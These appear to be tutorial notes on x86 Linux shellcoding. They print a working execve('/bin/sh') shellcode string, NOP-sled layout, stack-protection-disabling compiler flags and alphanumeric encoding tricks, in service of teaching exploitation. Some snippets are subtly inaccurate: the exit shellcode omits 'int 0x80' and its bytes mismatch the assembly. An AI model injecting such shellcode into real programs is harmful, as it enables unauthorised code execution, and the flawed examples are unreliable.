#Shellcoding

**Shellcode** -- A set of instructions that are injected by the user 
and executed by the exploited `binary`, It's generally the ‘payload’ of
an `exploit`.

Using shellcode you can essentially make a program execute code that 
never existed in the original binary. You’re basically injecting code.

Why the name “shellcode”?  historically started a command shell 

Shellcode is generally hand coded in assembly, but its functionality 
can be represented in C

```c
char *shell[2];

shell[0] = "/bin/sh";
shell[1] = NULL;

execve(shell[0], shell, NULL);
exit(0);
```

Shellcode as a String

```c
char shellcode[] =
 "\x31\xc0\x50\x68\x2f\x2f\x73"
 "\x68\x68\x2f\x62\x69\x6e\x89"
 "\xe3\x89\xc1\x89\xc2\xb0\x0b"
 "\xcd\x80\x31\xc0\x40\xcd\x80";
```

When shellcode is read as a string, null bytes become an issue
with common string functions.

Solution: Make your shellcode NULL free!

The instruction

```asm
mov eax, 4 ; “\xB8\x04\x00\x00\x00”
```

can be replaced by:

```asm
mov al, 4 ; “\xb0\x04”
```

#Can you make shellcode smaller?

##Common Tricks

xoring anything with itself clears itself:

```asm
xor eax, eax ; "\x31\xC0"
```

clear three registers in four bytes:

```asm
xor ebx, ebx
mul ebx ; "\x31\xDB\xF7\xE3"
```

There’s always more than one way to do things

#Linux System Calls

System calls are how userland programs talk to
the kernel to do anything interesting:

  *  open files, read, write, map memory, execute programs, etc

  *  libc functions are high level syscall wrappers

     `fopen()`, `sscanf()`, `execv()`, `printf()` ...


#Using Syscalls in Shellcode

Like programs, your shellcode needs syscalls to do anything of interest

Syscalls can be made in x86 using interrupt 0x80 `int 0x80`

Look [here](http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html) for system call table.

#Syscall Summary

Linux Syscalls sorta use fastcall

  * specific syscall number is loaded into `eax`
  * arguments for call are placed in different registers 
  * `int 0x80` executes call to `syscall()`
  * CPU switches to kernel mode
  *  each syscall has a unique, static number

#Compiling Shellcode

Assemble to get object file, link any necessary object files and
extract shellcode from `objdump`

```asm
; exit_shellcode.asm
section .text
global _start
_start:
		xor ebx, ebx
		xor eax, eax
		mov al, 1
```

```
$ nasm -f elf32 exit_shellcode.asm
$ ld -o exit_shellcode exit_shellcode.o
$ objdump -M intel -d exit_shellcode
```

Our shellcode as a string, extracted from `objdump`:

```
"\x31\xc0\x31\xDB\xB0\x01\xCD\x80" 
```

##Stages of Compilation

[here image]

#Shellcoding Tools We <3

Writing Shellcode

  * `pwntools` (python package)
    * `asm`
    * `disasm`

Testing Shellcode

  * `shtest`

##asm / disasm

Basic Usage, you should read the help’s (`-h`)

```asm
$ asm
 xor eax, eax
 (ctrl+d)
 31c0

$ disasm 31c0
 0: 31 c0 xor eax,eax
```

#Shellcode in Exploitation

 In the real world, 99% of binaries won’t have a ‘win’ function 
laying around for you to return to once you hijack control flow... so 
what do you do instead?

You inject **shellcode** as part of your payload and return to that!

#NOP Sleds

Remember ‘nop’ (`\x90`) is an instruction that does nothing

If you don’t know the exact address of your shellcode in memory, pad 
your **exploit** with `nop` instructions to make it more reliable!

```
90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90
90 90 shellcode 90 90 90 90 addr
```

`addr` is return address

#Party like It’s ‘99

```
gcc -z execstack -fno-stack-protector
```

This is classical exploitation - it’s not as easy to simply inject 
and execute shellcode anymore; 

**but you must walk before you can run**

#Function Constraints

`fgets()` reads stdin until input length, `scanf()` and `gets()` read 
until terminating character (rare to see `gets` or ‘insecure’ 
functions used nowadays)

`\x00` (NULL) byte stops most string functions:

  * `strcpy()`, `strlen()`, `strcat()`, `strcmp()` ...

`\x0A` (newline) byte causes `gets()`, `fgets()` to stop reading.
**But not NULLs!**

`fgets()` and `gets()` stop only after an `EOF` or a newline. 

#Little Endian

In memory, stuff is going in backwards

```
String Input: “\x41\x42\x43\x44” (ABCD)
On the Stack: “\x44\x43\x42\x41” (DCBA)
```

Target Address in Python: 

```py
pack ( ‘<I’, 0xDDEEFFGG)
```

#Alphanumeric Shellcode

**Scenario:** Sometimes a program accepts only ASCII characters...
so you need alphanumeric shellcode! 

Functions such as `isalnum()` from `ctype.h` are used to check if 
strings are alphanumeric

```
OP Code Hex ASCII
inc eax 0x40 @
inc ebx 0x43 C
inc ecx 0x41 A
inc edx 0x42 B
dec eax 0x48 H
dec ebx 0x4B K
dec ecx 0x49 I
dec edx 0x4A J
```

to zero out `eax`:

```asm
and eax, 0x454e4f4a
and eax, 0x3a313035
```

=> `"\x25\x4A\x4F\x4E\x45\x25\x35\x30\x31\x3A"`

move `eax` into `esp`

```asm
push eax
pop esp
```

=> `"\x50\x5C"`

Can generally do what you need to, but it’s trickier and takes more 
bytes
